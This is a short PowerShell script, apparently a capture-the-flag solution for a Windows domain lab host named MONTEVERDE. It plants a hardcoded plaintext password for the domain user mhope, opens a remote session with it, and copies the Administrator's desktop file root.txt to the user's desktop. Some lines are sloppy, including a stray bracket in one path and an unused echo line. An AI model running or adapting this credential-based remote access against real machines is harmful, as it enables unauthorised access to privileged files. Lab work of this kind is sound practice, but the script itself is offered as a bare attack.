
````
$SecPassword = ConvertTo-SecureString '4n0therD4y@n0th3r$' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\mhope', $SecPassword)


$session = New-PSSession -ComputerName MONTEVERDE.MEGABANK.LOCAL -Credential $Cred

$cmd = echo haha>C:\Users\mhope\Desktop\sm.txt

Invoke-Command -Session $session -ScriptBlock {
    "type C:\Users\Administrator]\Desktop\root.txt" | Out-File -FilePath "C:\Users\mhope\Desktop\sm.txt" -Encoding UTF8
}

Invoke-Command -Session $session -ScriptBlock {
    Get-Content "C:\Users\Administrator\Desktop\root.txt" | Out-File -Encoding ASCII -FilePath "C:\Users\mhope\Desktop\sm.txt"
}


````